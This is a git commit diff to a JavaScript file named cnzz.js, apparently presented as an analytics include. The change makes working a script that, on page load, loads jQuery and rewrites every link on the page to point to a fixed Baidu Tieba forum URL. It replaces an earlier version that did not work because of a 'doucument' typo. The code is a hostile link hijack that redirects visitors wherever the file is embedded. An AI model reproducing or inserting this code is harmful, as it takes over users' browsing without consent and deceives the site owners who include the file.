1bdca313ca294d79556a4301f4cc755ba2e2ed2d
i566 <58461724+i566@users.noreply.github.com>
2020-01-03 13:02:02 +0800

    Update cnzz.js

--- cnzz.js
+++ cnzz.js
@@ -1,9 +1,7 @@
 document.writeln('<script src="https://cdn.staticfile.org/jquery/2.0.0/jquery.min.js"><\/script>');
-document.onreadystatechange = function(){
-    if(doucument.readyState == 'complete'){
-      for(var i = 1;i<=100;i++){
+window.onload = function () {
+for(var i = 1;i<=100;i++){
 $('body [href]').attr('href','http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5'); 
 }
-    }
-}
+       }
 
